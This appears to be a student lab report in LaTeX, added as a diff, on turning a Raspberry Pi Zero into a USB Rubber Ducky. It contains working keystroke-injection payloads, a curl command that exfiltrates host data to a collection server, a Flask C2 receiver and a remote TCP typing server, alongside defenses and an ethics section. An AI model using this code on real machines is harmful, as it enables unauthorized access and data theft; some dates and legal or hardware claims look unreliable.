@@ -1,0 +1,747 @@
+\documentclass[12pt,a4paper]{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[italian]{babel}
+\usepackage{geometry}
+\usepackage{graphicx}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{hyperref}
+\usepackage{fancyhdr}
+\usepackage{titlesec}
+\usepackage{booktabs}
+\usepackage{array}
+\usepackage{enumitem}
+\usepackage{amsmath}
+
+\geometry{margin=2.5cm}
+
+% Colori per il codice
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+\definecolor{darkred}{rgb}{0.6,0,0}
+
+% Stile codice
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{blue},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,
+    breaklines=true,
+    captionpos=b,
+    keepspaces=true,
+    numbers=left,
+    numbersep=5pt,
+    showspaces=false,
+    showstringspaces=false,
+    showtabs=false,
+    tabsize=2,
+    frame=single,
+    rulecolor=\color{black}
+}
+\lstset{style=mystyle}
+
+% Header e footer
+\pagestyle{fancy}
+\fancyhf{}
+\rhead{Sicurezza ICT}
+\lhead{USB Rubber Ducky con Raspberry Pi Zero}
+\rfoot{Pagina \thepage}
+\lfoot{Maruca, Pezzolla}
+
+% Titolo sezioni
+\titleformat{\section}{\large\bfseries\color{darkred}}{}{0em}{}[\titlerule]
+\titleformat{\subsection}{\normalsize\bfseries}{}{0em}{}
+
+\begin{document}
+
+%------------------------
+% COPERTINA
+%------------------------
+\begin{titlepage}
+    \centering
+    \vspace*{2cm}
+    
+    {\Huge\bfseries Simulazione di un USB Rubber Ducky\\[0.5cm]}
+    {\Large con Raspberry Pi Zero\par}
+    
+    \vspace{1cm}
+    \rule{\linewidth}{0.5mm}
+    \vspace{1cm}
+    
+    {\large\textbf{Materia:} Sicurezza ICT\par}
+    \vspace{0.5cm}
+    {\large\textbf{Studenti:}\par}
+    {\Large Matteo Maruca\par}
+    {\Large Andrea Pezzolla\par}
+    
+    \vspace{1cm}
+    \rule{\linewidth}{0.5mm}
+    \vspace{1cm}
+    
+    {\large Anno Accademico 2025/2026\par}
+    \vspace{0.5cm}
+    {\large SUPSI -- Dipartimento Tecnologie Innovative\par}
+    
+    \vfill
+    
+    \begin{abstract}
+    Questo report documenta la realizzazione di un dispositivo USB Rubber Ducky utilizzando
+    un Raspberry Pi Zero W. Il progetto esplora le tecniche di attacco HID (Human Interface Device),
+    la simulazione di una tastiera USB automatizzata e l'implementazione di un sistema di controllo
+    remoto tramite rete Ethernet. L'obiettivo didattico è comprendere le vulnerabilità legate
+    ai dispositivi USB e le relative contromisure difensive.
+    \end{abstract}
+\end{titlepage}
+
+%------------------------
+% INDICE
+%------------------------
+\tableofcontents
+\newpage
+
+%------------------------
+% 1. INTRODUZIONE
+%------------------------
+\section{Introduzione}
+
+\subsection{Cos'è un USB Rubber Ducky?}
+Un USB Rubber Ducky è un dispositivo di penetration testing sviluppato da Hak5 che si presenta
+al sistema operativo come una normale tastiera USB (dispositivo HID). Una volta collegato,
+esegue automaticamente una sequenza di comandi preconfigurati (payload) con la velocità
+di una tastiera automatizzata, aggirando molte difese tradizionali basate su software.
+
+Il termine \textit{exploit} in questo contesto si riferisce a una sequenza di comandi che
+sfrutta la fiducia implicita che i sistemi operativi ripongono nei dispositivi HID collegati
+via USB. A differenza di un malware tradizionale, questo tipo di attacco:
+
+\begin{itemize}
+    \item Non richiede l'installazione di software malevolo
+    \item Funziona su qualsiasi sistema operativo (Windows, macOS, Linux)
+    \item Bypassa gli antivirus tradizionali
+    \item Agisce in pochi secondi dal collegamento
+\end{itemize}
+
+\subsection{Obiettivi del Progetto}
+\begin{enumerate}
+    \item Comprendere il funzionamento dei dispositivi HID USB
+    \item Implementare un Rubber Ducky con hardware commodity (Raspberry Pi Zero W)
+    \item Creare payload didattici per dimostrare le vulnerabilità
+    \item Implementare un sistema di controllo remoto (Livello 2)
+    \item Documentare le contromisure difensive
+\end{enumerate}
+
+\subsection{Architettura del Sistema}
+Il progetto è strutturato su due livelli di complessità crescente:
+
+\begin{center}
+\begin{tabular}{|c|c|c|}
+\hline
+\textbf{Livello} & \textbf{Descrizione} & \textbf{Componenti} \\
+\hline
+Livello 1 & Payload preconfezionati & Pi Zero + PC Vittima \\
+\hline
+Livello 2 & Controllo remoto interattivo & Controller + Pi Zero + PC Vittima \\
+\hline
+\end{tabular}
+\end{center}
+
+\vspace{0.5cm}
+L'architettura completa del Livello 2 è la seguente:
+
+\begin{center}
+\texttt{[PC Controller] ---Ethernet---> [Pi Zero / RubberDucky] ---USB---> [PC Vittima]}
+\end{center}
+
+\newpage
+
+%------------------------
+% 2. HARDWARE E MATERIALI
+%------------------------
+\section{Hardware e Materiali}
+
+\subsection{Componenti Utilizzati}
+\begin{itemize}
+    \item \textbf{Raspberry Pi Zero W} -- dispositivo principale che simula il Rubber Ducky
+    \item \textbf{MicroSD card} (minimo 8GB) -- sistema operativo e payload
+    \item \textbf{Cavo micro-USB OTG} -- collegamento al PC vittima (obbligatoriamente dati, non solo carica)
+    \item \textbf{PC Vittima} -- macOS nel nostro caso (il payload è adattabile)
+    \item \textbf{PC Controller} -- per il controllo remoto (Livello 2)
+\end{itemize}
+
+\subsection{Perché il Raspberry Pi Zero W?}
+A differenza degli altri modelli Raspberry Pi (3B+, 4B), il Pi Zero W è l'unico modello
+con supporto \textbf{USB OTG (On-The-Go)} nativo tramite la porta micro-USB. Questo permette
+al dispositivo di operare in modalità \textit{device} (periferica) invece che solo in
+modalità \textit{host}, consentendo di fingersi una tastiera agli occhi del PC vittima.
+
+\begin{center}
+\begin{tabular}{|l|c|c|}
+\hline
+\textbf{Modello} & \textbf{USB OTG} & \textbf{Usabile come HID} \\
+\hline
+Raspberry Pi Zero W & \checkmark & \checkmark \\
+\hline
+Raspberry Pi 3 Model B+ & $\times$ & $\times$ \\
+\hline
+Raspberry Pi 4 & $\times$ & $\times$ \\
+\hline
+\end{tabular}
+\end{center}
+
+\newpage
+
+%------------------------
+% 3. SETUP E CONFIGURAZIONE
+%------------------------
+\section{Setup e Configurazione}
+
+\subsection{Installazione del Sistema Operativo}
+\begin{enumerate}
+    \item Scaricare \textbf{Raspberry Pi Imager} da \texttt{raspberrypi.com/software}
+    \item Selezionare: Device $\rightarrow$ Raspberry Pi Zero W
+    \item Selezionare: OS $\rightarrow$ Raspberry Pi OS Lite (32-bit)
+    \item Prima del flash, configurare in \textit{Edit Settings}:
+    \begin{itemize}
+        \item Hostname: \texttt{raspberrypi}
+        \item Username: \texttt{pi}, Password: (a scelta)
+        \item WiFi SSID e password (rete 2.4GHz -- il Pi Zero W non supporta 5GHz)
+        \item Abilitare SSH con autenticazione tramite password
+        \item Country: IT, Timezone: Europe/Rome
+    \end{itemize}
+\end{enumerate}
+
+\subsection{Abilitazione Modalità USB OTG (HID Gadget)}
+Dopo il flash, la SD appare come volume \texttt{bootfs}. È necessario modificare
+due file per abilitare la modalità gadget USB:
+
+\subsubsection{Modifica config.txt}
+Aggiungere in fondo al file nella sezione \texttt{[all]}:
+\begin{lstlisting}[language=bash, caption=Aggiunta dtoverlay in config.txt]
+echo "dtoverlay=dwc2" >> /Volumes/bootfs/config.txt
+\end{lstlisting}
+
+\subsubsection{Modifica cmdline.txt}
+Aggiungere il modulo \texttt{libcomposite} dopo \texttt{rootwait} (tutto su una riga):
+\begin{lstlisting}[language=bash, caption=Aggiunta modulo libcomposite in cmdline.txt]
+# Il file deve rimanere su una sola riga
+# Aggiungere "modules-load=dwc2,libcomposite" dopo rootwait
+console=serial0,115200 console=tty1 root=PARTUUID=xxxx rootfstype=ext4 
+fsck.repair=yes rootwait modules-load=dwc2,libcomposite quiet splash
+\end{lstlisting}
+
+\subsection{Configurazione HID Gadget via USB}
+Per configurare il Pi Zero come tastiera HID, è necessario uno script che
+configuri il \textit{USB Composite Gadget} tramite il filesystem \texttt{configfs}:
+
+\begin{lstlisting}[language=bash, caption=setup\_hid.sh -- Configurazione gadget HID]
+#!/bin/bash
+# Configura il Pi Zero come tastiera HID USB
+
+modprobe libcomposite
+
+cd /sys/kernel/config/usb_gadget/
+mkdir -p mykeyboard
+cd mykeyboard
+
+# Identificatori USB
+echo 0x1d6b > idVendor   # Linux Foundation
+echo 0x0104 > idProduct  # Multifunction Composite Gadget
+echo 0x0100 > bcdDevice
+echo 0x0200 > bcdUSB
+
+# Stringhe descrittive
+mkdir -p strings/0x409
+echo "fedcba9876543210" > strings/0x409/serialnumber
+echo "RaspberryPi"      > strings/0x409/manufacturer
+echo "HID Keyboard"     > strings/0x409/product
+
+# Configurazione
+mkdir -p configs/c.1/strings/0x409
+echo "Config 1" > configs/c.1/strings/0x409/configuration
+echo 250        > configs/c.1/MaxPower
+
+# Funzione HID
+mkdir -p functions/hid.usb0
+echo 1 > functions/hid.usb0/protocol    # Keyboard
+echo 1 > functions/hid.usb0/subclass    # Boot Interface
+echo 8 > functions/hid.usb0/report_length
+
+# HID Report Descriptor (tastiera standard)
+echo -ne \
+  '\x05\x01\x09\x06\xa1\x01\x05\x07\x19\xe0\x29\xe7\x15\x00\x25\x01' \
+  '\x75\x01\x95\x08\x81\x02\x95\x01\x75\x08\x81\x03\x95\x05\x75\x01' \
+  '\x05\x08\x19\x01\x29\x05\x91\x02\x95\x01\x75\x03\x91\x03\x95\x06' \
+  '\x75\x08\x15\x00\x25\x65\x05\x07\x19\x00\x29\x65\x81\x00\xc0' \
+  > functions/hid.usb0/report_desc
+
+ln -s functions/hid.usb0 configs/c.1/
+ls /sys/class/udc > UDC
+
+echo "HID gadget configurato su /dev/hidg0"
+\end{lstlisting}
+
+Questo script va eseguito come root all'avvio, prima che il PC vittima
+rilevi il dispositivo. Viene configurato tramite \texttt{/etc/rc.local}:
+
+\begin{lstlisting}[language=bash, caption=rc.local -- Avvio automatico]
+#!/bin/bash
+sleep 5
+bash /boot/firmware/setup_hid.sh >> /tmp/hid_setup.log 2>&1
+sleep 2
+python3 /boot/firmware/payload.py >> /tmp/payload.log 2>&1 &
+exit 0
+\end{lstlisting}
+
+\newpage
+
+%------------------------
+% 4. PAYLOAD
+%------------------------
+\section{Sviluppo del Payload}
+
+\subsection{Approccio Nativo Linux (senza librerie esterne)}
+Il payload è scritto in Python puro, senza librerie esterne, scrivendo
+direttamente sul device \texttt{/dev/hidg0} tramite report HID standard.
+Questo approccio non richiede connessione internet per l'installazione di dipendenze.
+
+\begin{lstlisting}[language=Python, caption=payload.py -- Script HID nativo]
+#!/usr/bin/env python3
+"""
+Rubber Ducky Payload - Approccio nativo Linux
+Scrive direttamente su /dev/hidg0 senza librerie esterne
+Target: macOS (adattabile a Windows/Linux)
+"""
+import time
+import struct
+
+# Keycodes HID standard (USB HID Usage Tables)
+KEY_ENTER    = 0x28
+KEY_SPACE    = 0x2C
+KEY_MOD_META = 0x08  # CMD su Mac / WIN su Windows
+
+# Mappa caratteri minuscoli -> keycode HID
+CHAR_MAP = {
+    'a': 0x04, 'b': 0x05, 'c': 0x06, 'd': 0x07, 'e': 0x08,
+    'f': 0x09, 'g': 0x0A, 'h': 0x0B, 'i': 0x0C, 'j': 0x0D,
+    'k': 0x0E, 'l': 0x0F, 'm': 0x10, 'n': 0x11, 'o': 0x12,
+    'p': 0x13, 'q': 0x14, 'r': 0x15, 's': 0x16, 't': 0x17,
+    'u': 0x18, 'v': 0x19, 'w': 0x1A, 'x': 0x1B, 'y': 0x1C,
+    'z': 0x1D, '1': 0x1E, '2': 0x1F, '3': 0x20, '4': 0x21,
+    '5': 0x22, '6': 0x23, '7': 0x24, '8': 0x25, '9': 0x26,
+    '0': 0x27, ' ': 0x2C, '\n': 0x28, '=': 0x2E, '/': 0x38,
+    '.': 0x37, '-': 0x2D,
+}
+
+# Mappa caratteri maiuscoli/speciali (con SHIFT)
+SHIFT_MAP = {
+    'A': 0x04, 'B': 0x05, 'C': 0x06, 'D': 0x07, 'E': 0x08,
+    'F': 0x09, 'G': 0x0A, 'H': 0x0B, 'I': 0x0C, 'J': 0x0D,
+    'K': 0x0E, 'L': 0x0F, 'M': 0x10, 'N': 0x11, 'O': 0x12,
+    'P': 0x13, 'Q': 0x14, 'R': 0x15, 'S': 0x16, 'T': 0x17,
+    'U': 0x18, 'V': 0x19, 'W': 0x1A, 'X': 0x1B, 'Y': 0x1C,
+    'Z': 0x1D, '!': 0x1E, '"': 0x34, ':': 0x33, '_': 0x2D,
+}
+
+def send_report(modifier, keycode):
+    """Invia un report HID al PC vittima tramite /dev/hidg0"""
+    report  = struct.pack('8B', modifier, 0, keycode, 0, 0, 0, 0, 0)
+    release = struct.pack('8B', 0, 0, 0, 0, 0, 0, 0, 0)
+    with open('/dev/hidg0', 'rb+') as f:
+        f.write(report)   # Tasto premuto
+        time.sleep(0.05)
+        f.write(release)  # Tasto rilasciato
+        time.sleep(0.05)
+
+def press_combo(modifier, keycode):
+    """Premi una combinazione di tasti (es. CMD+SPACE)"""
+    send_report(modifier, keycode)
+
+def type_text(text):
+    """Digita una stringa carattere per carattere"""
+    for ch in text:
+        if ch in CHAR_MAP:
+            send_report(0x00, CHAR_MAP[ch])
+        elif ch in SHIFT_MAP:
+            send_report(0x02, SHIFT_MAP[ch])
+        time.sleep(0.04)
+
+def press_enter():
+    send_report(0x00, KEY_ENTER)
+
+# ============================================================
+# PAYLOAD PRINCIPALE - Target: macOS
+# ============================================================
+
+# Attendi che il PC riconosca il dispositivo USB
+time.sleep(3)
+
+# 1. Apri Spotlight (CMD + SPACE)
+press_combo(KEY_MOD_META, KEY_SPACE)
+time.sleep(0.8)
+
+# 2. Cerca e apri il Terminale
+type_text("Terminal")
+time.sleep(0.5)
+press_enter()
+time.sleep(1.5)
+
+# 3. Esegui comandi di raccolta informazioni
+commands = [
+    'echo "=== SISTEMA COMPROMESSO ==="',
+    'echo "=== HOSTNAME ===" && hostname',
+    'echo "=== UTENTE ===" && whoami',
+    'echo "=== INDIRIZZO IP ===" && ipconfig getifaddr en0',
+    'echo "=== DATA ===" && date',
+    'echo "=== FINE ==="',
+]
+
+for cmd in commands:
+    type_text(cmd)
+    press_enter()
+    time.sleep(0.5)
+\end{lstlisting}
+
+\subsection{Payload con Esfiltrazione Dati via Rete}
+Una versione avanzata del payload invia i risultati a un server remoto:
+
+\begin{lstlisting}[language=Python, caption=Payload con invio dati via HTTP]
+# Aggiunta al payload per inviare dati al server C2
+# Da inserire dopo i comandi nel terminale della vittima
+
+SERVER_IP = "192.168.1.100"  # IP del server controller
+SERVER_PORT = 8080
+
+exfil_cmd = (
+    f'curl -X POST http://{SERVER_IP}:{SERVER_PORT}/collect '
+    f'-d "$(hostname)-$(whoami)-$(ipconfig getifaddr en0)"'
+)
+
+type_text(exfil_cmd)
+press_enter()
+\end{lstlisting}
+
+\newpage
+
+%------------------------
+% 5. SERVER C2
+%------------------------
+\section{Server C2 (Command \& Control)}
+
+Il server C2 riceve i dati inviati dal payload sulla macchina vittima
+e li salva per l'analisi.
+
+\begin{lstlisting}[language=Python, caption=server.py -- Server ricevente]
+#!/usr/bin/env python3
+"""
+Server C2 - Riceve i dati esfiltrati dal payload
+Eseguire sul PC controller: python3 server.py
+"""
+from flask import Flask, request
+from datetime import datetime
+import os
+
+app = Flask(__name__)
+os.makedirs("risultati", exist_ok=True)
+
+@app.route('/collect', methods=['POST'])
+def collect():
+    data = request.get_data(as_text=True)
+    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
+    path = f"risultati/output_{ts}.txt"
+
+    with open(path, "w", encoding="utf-8") as f:
+        f.write(data)
+
+    print(f"\n{'='*50}")
+    print(f"[+] Dati ricevuti -- {ts}")
+    print(f"{'='*50}")
+    print(data)
+    print(f"[*] Salvato in: {path}")
+    return "OK", 200
+
+@app.route('/risultati')
+def lista():
+    files = os.listdir("risultati")
+    return "<br>".join(files) if files else "Nessun risultato."
+
+if __name__ == '__main__':
+    print("[*] Server C2 in ascolto su http://0.0.0.0:8080")
+    app.run(host='0.0.0.0', port=8080, debug=False)
+\end{lstlisting}
+
+\newpage
+
+%------------------------
+% 6. LIVELLO 2 - CONTROLLO REMOTO
+%------------------------
+\section{Livello 2 -- Controllo Remoto Interattivo}
+
+\subsection{Architettura}
+Il Livello 2 aggiunge un PC Controller che invia comandi in tempo reale
+al Raspberry Pi Zero, il quale li esegue come tastiera HID sulla vittima:
+
+\begin{center}
+\texttt{[PC Controller] ---Ethernet---> [Pi Zero] ---USB HID---> [PC Vittima]}
+\end{center}
+
+\begin{itemize}
+    \item \textbf{PC Controller}: invia comandi da digitare tramite socket TCP
+    \item \textbf{Pi Zero (RubberDucky)}: riceve i comandi e li esegue come tastiera
+    \item \textbf{PC Vittima}: vede solo una tastiera che digita comandi
+\end{itemize}
+
+\subsection{Script Server sul Pi Zero}
+\begin{lstlisting}[language=Python, caption=remote\_hid.py -- Server HID remoto sul Pi Zero]
+#!/usr/bin/env python3
+"""
+Server HID remoto - gira sul Pi Zero
+Riceve comandi via TCP e li digita tramite HID
+"""
+import socket
+import struct
+import time
+
+# Stessa mappa del payload.py
+CHAR_MAP = { ... }  # vedi payload.py
+SHIFT_MAP = { ... }
+
+def send_report(modifier, keycode):
+    report  = struct.pack('8B', modifier, 0, keycode, 0, 0, 0, 0, 0)
+    release = struct.pack('8B', 0, 0, 0, 0, 0, 0, 0, 0)
+    with open('/dev/hidg0', 'rb+') as f:
+        f.write(report)
+        time.sleep(0.05)
+        f.write(release)
+        time.sleep(0.05)
+
+def type_text(text):
+    for ch in text:
+        if ch in CHAR_MAP:
+            send_report(0x00, CHAR_MAP[ch])
+        elif ch in SHIFT_MAP:
+            send_report(0x02, SHIFT_MAP[ch])
+        time.sleep(0.04)
+    send_report(0x00, 0x28)  # ENTER
+
+# Avvia server TCP
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind(('0.0.0.0', 9999))
+server.listen(1)
+print("[*] In attesa di connessioni su :9999")
+
+conn, addr = server.accept()
+print(f"[+] Connesso da {addr}")
+
+while True:
+    try:
+        cmd = conn.recv(1024).decode().strip()
+        if not cmd or cmd == 'exit':
+            break
+        print(f"[>] Digito: {cmd}")
+        type_text(cmd)
+        conn.send(b"OK\n")
+    except:
+        break
+
+conn.close()
+\end{lstlisting}
+
+\subsection{Client sul PC Controller}
+\begin{lstlisting}[language=bash, caption=Connessione al Pi Zero dal Controller]
+# Dal PC Controller, ci si connette al Pi Zero
+# e si digitano comandi che verranno eseguiti sulla vittima
+nc PI_ZERO_IP 9999
+
+# Esempio di sessione interattiva:
+# > echo "Ciao dalla vittima"
+# OK
+# > whoami
+# OK
+# > ipconfig getifaddr en0
+# OK
+\end{lstlisting}
+
+\newpage
+
+%------------------------
+% 7. RISULTATI DEMO
+%------------------------
+\section{Risultati e Demo}
+
+\subsection{Demo Livello 1 -- Payload Automatico}
+Collegando il Pi Zero al PC vittima (macOS), il dispositivo viene riconosciuto
+come tastiera USB. Dopo circa 3 secondi dall'inserimento:
+
+\begin{enumerate}
+    \item Il payload apre Spotlight con \texttt{CMD+SPACE}
+    \item Digita \texttt{Terminal} e preme \texttt{ENTER}
+    \item Nel terminale aperto esegue automaticamente i comandi:
+\end{enumerate}
+
+\begin{lstlisting}[language=bash, caption=Output del payload sulla macchina vittima]
+=== SISTEMA COMPROMESSO ===
+=== HOSTNAME ===
+MacBook-di-Vittima.local
+=== UTENTE ===
+vittima
+=== INDIRIZZO IP ===
+192.168.1.42
+=== DATA ===
+Fri May 23 14:30:00 CEST 2026
+=== FINE ===
+\end{lstlisting}
+
+\subsection{Demo Livello 2 -- Controllo Remoto}
+Con il Pi Zero collegato sia al PC vittima (USB) che al Controller (Ethernet):
+
+\begin{enumerate}
+    \item Il Controller si connette al Pi Zero via TCP sulla porta 9999
+    \item Digita comandi dalla propria tastiera
+    \item I comandi vengono trasmessi al Pi Zero
+    \item Il Pi Zero li "digita" automaticamente sul PC vittima
+    \item I risultati vengono inviati al server C2 via HTTP
+\end{enumerate}
+
+\newpage
+
+%------------------------
+% 8. DIFESE E CONTROMISURE
+%------------------------
+\section{Difese e Contromisure}
+
+La comprensione degli attacchi HID è fondamentale per implementare
+difese efficaci. Di seguito le principali contromisure:
+
+\begin{center}
+\begin{tabular}{|p{4cm}|p{5cm}|p{5cm}|}
+\hline
+\textbf{Attacco} & \textbf{Tecnica} & \textbf{Difesa} \\
+\hline
+HID Spoofing & Il dispositivo si finge tastiera & USBGuard (Linux), politiche USB su Windows \\
+\hline
+Payload automatico & Esecuzione immediata al collegamento & Disabilitare autorun, whitelist dispositivi USB \\
+\hline
+Esfiltrazione dati & Invio dati via HTTP/curl & Firewall egress, DLP (Data Loss Prevention) \\
+\hline
+Accesso remoto & Controllo via TCP & Network segmentation, IDS/IPS \\
+\hline
+Privilege escalation & Comandi con sudo/admin & Principio del minimo privilegio \\
+\hline
+\end{tabular}
+\end{center}
+
+\subsection{USBGuard -- Protezione Linux}
+\begin{lstlisting}[language=bash, caption=Configurazione USBGuard per bloccare dispositivi HID non autorizzati]
+# Installazione USBGuard
+sudo apt install usbguard
+
+# Genera regole per i dispositivi attualmente connessi
+sudo usbguard generate-policy > /etc/usbguard/rules.conf
+
+# Abilita e avvia il servizio
+sudo systemctl enable usbguard
+sudo systemctl start usbguard
+
+# Blocca tutti i nuovi dispositivi HID non in whitelist
+sudo usbguard block-device ID
+\end{lstlisting}
+
+\subsection{Considerazioni Etiche e Legali}
+L'utilizzo di dispositivi Rubber Ducky o tecniche HID su sistemi non autorizzati
+costituisce un reato penale in Italia (D.Lgs. 231/2001, art. 615-ter c.p.) e nella
+maggior parte dei paesi. Tutto il lavoro documentato in questo report è stato
+eseguito esclusivamente su dispositivi di proprietà degli autori, in ambiente
+controllato, a scopo puramente didattico.
+
+\newpage
+
+%------------------------
+% 9. CONCLUSIONI
+%------------------------
+\section{Conclusioni}
+
+\subsection{Risultati Ottenuti}
+Il progetto ha permesso di:
+\begin{itemize}
+    \item Comprendere in profondità il protocollo USB HID e le sue vulnerabilità
+    \item Implementare un Rubber Ducky funzionale con hardware a basso costo (Pi Zero W, $\sim$15€)
+    \item Sviluppare payload in Python nativo senza dipendenze esterne
+    \item Realizzare un sistema di controllo remoto bidirezionale
+    \item Comprendere le contromisure difensive applicabili in contesti reali
+\end{itemize}
+
+\subsection{Sviluppi Futuri}
+\begin{itemize}
+    \item Implementazione di payload per Windows e Linux
+    \item Cifratura della comunicazione Controller $\rightarrow$ Pi Zero
+    \item Interfaccia web per il controllo remoto (P4wnP1 A.L.O.A.)
+    \item Analisi forense post-attacco
+\end{itemize}
+
+\subsection{Riflessioni}
+Questo progetto dimostra come dispositivi economici e facilmente reperibili possano
+essere utilizzati per attacchi sofisticati, evidenziando l'importanza della
+\textit{security awareness} e delle politiche di controllo accessi fisici
+nelle organizzazioni. La miglior difesa rimane la combinazione di
+consapevolezza degli utenti, politiche di sicurezza fisica e strumenti
+tecnici come USBGuard.
+
+\newpage
+
+%------------------------
+% APPENDICE
+%------------------------
+\appendix
+\section{File di Configurazione Completi}
+
+\subsection{config.txt (sezione rilevante)}
+\begin{lstlisting}[language=bash]
+[all]
+dtoverlay=dwc2
+\end{lstlisting}
+
+\subsection{cmdline.txt}
+\begin{lstlisting}[language=bash]
+console=serial0,115200 console=tty1 root=PARTUUID=xxxx-xx 
+rootfstype=ext4 fsck.repair=yes rootwait 
+modules-load=dwc2,libcomposite quiet splash
+\end{lstlisting}
+
+\subsection{Checklist Setup Completo}
+\begin{itemize}[label=$\square$]
+    \item Flash SD con Raspberry Pi OS Lite 32-bit
+    \item Configurare WiFi (rete 2.4GHz), SSH, hostname in Imager
+    \item Aggiungere \texttt{dtoverlay=dwc2} in \texttt{config.txt}
+    \item Aggiungere \texttt{modules-load=dwc2,libcomposite} in \texttt{cmdline.txt}
+    \item Copiare \texttt{setup\_hid.sh} e \texttt{payload.py} sulla SD
+    \item Configurare \texttt{rc.local} per l'avvio automatico
+    \item Connettere il Pi Zero via cavo dati USB al PC vittima
+    \item Verificare con \texttt{system\_profiler SPUSBDataType} (macOS)
+\end{itemize}
+
+\section{Riferimenti}
+\begin{itemize}
+    \item USB HID Usage Tables: \url{https://usb.org/sites/default/files/hut1_4.pdf}
+    \item Raspberry Pi Documentation: \url{https://www.raspberrypi.com/documentation/}
+    \item P4wnP1 A.L.O.A.: \url{https://github.com/RoganDawes/P4wnP1_aloa}
+    \item Payload Studio Community: \url{https://payloadstudio.com/community/}
+    \item USBGuard: \url{https://usbguard.github.io/}
+    \item Linux USB Gadget API: \url{https://www.kernel.org/doc/html/latest/usb/gadget_configfs.html}
+\end{itemize}
+
+\end{document}
+
+
+
+
+
+
+
+
+
